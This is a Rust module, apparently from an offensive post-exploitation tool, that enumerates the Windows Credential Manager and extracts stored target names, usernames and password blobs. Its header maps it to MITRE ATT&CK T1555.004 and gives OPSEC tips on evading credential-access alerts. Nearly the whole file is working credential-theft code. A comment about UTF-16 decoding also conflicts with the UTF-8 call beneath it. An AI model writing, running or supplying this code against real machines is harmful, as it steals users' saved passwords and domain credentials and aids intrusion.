//! Windows Credential Vault extraction
//!
//! Extracts credentials from Windows Credential Manager including:
//! - Generic credentials (applications)
//! - Domain credentials
//! - Certificate-based credentials
//!
//! ## MITRE ATT&CK
//! - T1555.004: Credentials from Password Stores: Windows Credential Manager
//!
//! ## OPSEC
//! - Vault access requires user context
//! - May trigger credential access alerts
//! - Consider targeting specific credential names

#[allow(unused_imports)]
use common::{CredentialInfo, CredentialOutput, KrakenError};

/// Dump Windows Credential Vault
#[cfg(windows)]
pub fn dump() -> Result<CredentialOutput, KrakenError> {
    use windows_sys::Win32::Foundation::TRUE;
    use windows_sys::Win32::Security::Credentials::{
        CredEnumerateW, CredFree, CREDENTIALW, CRED_ENUMERATE_ALL_CREDENTIALS,
    };

    let mut credentials = Vec::new();

    unsafe {
        let mut cred_count: u32 = 0;
        let mut cred_array: *mut *mut CREDENTIALW = std::ptr::null_mut();

        // Enumerate all credentials
        let result = CredEnumerateW(
            std::ptr::null(),
            CRED_ENUMERATE_ALL_CREDENTIALS,
            &mut cred_count,
            &mut cred_array,
        );

        if result != TRUE {
            return Err(KrakenError::Module(
                "Failed to enumerate credentials - check user context".into(),
            ));
        }

        if cred_count > 0 && !cred_array.is_null() {
            for i in 0..cred_count as isize {
                let cred = *cred_array.offset(i);
                if cred.is_null() {
                    continue;
                }

                let cred_ref = &*cred;

                // Extract target name
                let target = if !cred_ref.TargetName.is_null() {
                    wstr_to_string(cred_ref.TargetName)
                } else {
                    String::new()
                };

                // Extract username
                let username = if !cred_ref.UserName.is_null() {
                    wstr_to_string(cred_ref.UserName)
                } else {
                    String::new()
                };

                // Extract credential blob (password)
                let password = if cred_ref.CredentialBlobSize > 0
                    && !cred_ref.CredentialBlob.is_null()
                {
                    let slice = std::slice::from_raw_parts(
                        cred_ref.CredentialBlob,
                        cred_ref.CredentialBlobSize as usize,
                    );
                    // Try to interpret as UTF-16 string
                    String::from_utf8_lossy(slice).to_string()
                } else {
                    String::new()
                };

                let cred_type = match cred_ref.Type {
                    1 => "generic",
                    2 => "domain_password",
                    3 => "domain_certificate",
                    4 => "domain_visible_password",
                    5 => "generic_certificate",
                    6 => "domain_extended",
                    _ => "unknown",
                };

                credentials.push(CredentialInfo {
                    credential_type: cred_type.to_string(),
                    domain: target.clone(),
                    username,
                    data: if password.is_empty() {
                        "[no blob]".to_string()
                    } else {
                        password
                    },
                    source: format!("Vault:{}", target),
                });
            }

            CredFree(cred_array as *mut _);
        }
    }

    if credentials.is_empty() {
        tracing::info!("No credentials found in vault");
    }

    Ok(CredentialOutput { credentials })
}

#[cfg(windows)]
unsafe fn wstr_to_string(ptr: *const u16) -> String {
    if ptr.is_null() {
        return String::new();
    }

    let mut len = 0;
    while *ptr.offset(len) != 0 {
        len += 1;
    }

    let slice = std::slice::from_raw_parts(ptr, len as usize);
    String::from_utf16_lossy(slice)
}

#[cfg(not(windows))]
pub fn dump() -> Result<CredentialOutput, KrakenError> {
    Err(KrakenError::Module(
        "Vault extraction only supported on Windows".into(),
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    #[cfg(not(windows))]
    fn test_vault_unsupported_platform() {
        let result = dump();
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("only supported on Windows"));
    }
}
